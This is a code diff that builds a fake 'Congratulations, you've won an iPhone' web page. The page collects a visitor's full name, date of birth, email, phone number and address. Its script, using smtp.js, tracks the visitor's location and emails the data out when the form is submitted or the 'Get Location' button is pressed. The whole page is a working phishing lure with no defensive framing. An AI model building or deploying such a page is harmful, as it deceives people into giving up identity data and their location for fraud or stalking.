@@ -1,4 +1,130 @@
-<script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iPhone Reward Form</title>
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f8ff;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            max-width: 600px;
+            background: #ffffff;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+        .form-heading {
+            color: #333;
+            font-size: 1.8rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        .lead {
+            color: #555;
+            font-size: 1rem;
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            font-weight: bold;
+            color: #444;
+        }
+        .form-control {
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            padding: 10px;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+        .form-control:focus {
+            border-color: #007bff;
+            box-shadow: 0 0 8px rgba(0, 123, 255, 0.2);
+        }
+        .btn-primary {
+            background-color: #007bff;
+            border: none;
+            border-radius: 8px;
+            padding: 10px 20px;
+            font-size: 1rem;
+            margin-top: 15px;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+        .btn-primary:hover {
+            background-color: #0056b3;
+            transform: translateY(-2px);
+        }
+        .form-text {
+            font-size: 0.9rem;
+            color: #666;
+            margin-top: 10px;
+        }
+        #locationDisplay {
+            background: #e9ecef;
+            color: #666;
+            padding: 0.5rem;
+            border-radius: 4px;
+            margin-top: 15px;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="form-heading">Congratulations! 🎉</h1>
+        <p class="lead">You've been selected to receive a brand-new iPhone!</p>
+        <p class="form-text">Please fill out the form below to claim your reward.</p>
+
+        <!-- Fill Out Form -->
+        <form id="rewardForm">
+            <div class="form-group">
+                <label for="fullName">Full Name</label>
+                <input type="text" class="form-control" id="fullName" placeholder="Enter your full name" required>
+            </div>
+            <div class="form-group">
+                <label for="dob">Date of Birth</label>
+                <input type="date" class="form-control" id="dob" required>
+            </div>
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" class="form-control" id="email" placeholder="Enter your email" required>
+            </div>
+            <div class="form-group">
+                <label for="phoneNumber">Phone Number</label>
+                <input type="tel" class="form-control" id="phoneNumber" placeholder="Enter your phone number" required>
+            </div>
+            <div class="form-group">
+                <label for="address">Shipping Address</label>
+                <textarea class="form-control" id="address" rows="3" placeholder="Enter your shipping address" required></textarea>
+            </div>
+            <div class="form-group">
+                <label for="city">City</label>
+                <input type="text" class="form-control" id="city" placeholder="Enter your city" required>
+            </div>
+            <div class="form-group">
+                <label for="postalCode">Postal Code</label>
+                <input type="text" class="form-control" id="postalCode" placeholder="Enter your postal code" required>
+            </div>
+
+            <p id="locationDisplay" class="form-text">Location permissions required to auto-fill your location.</p>
+            <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
+        </form>
+
+        <button id="getLocationBtn" class="btn btn-secondary btn-block" style="margin-top: 15px;">Get Location</button>
+    </div>
+
+    <!-- JavaScript code -->
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
     function sendEmail(subject, message, recipientEmail) {
         try {
             Email.send({
@@ -60,9 +186,16 @@
         }
     }
 
+    // Trigger location request on button click
+    document.getElementById("getLocationBtn").addEventListener("click", function() {
+        trackMovement();
+    });
+
     // When the form is submitted, track location and send email
     document.getElementById("rewardForm").addEventListener("submit", function(event) {
         event.preventDefault(); // Prevent form submission
         trackMovement();
     });
 </script>
+</body>
+</html>
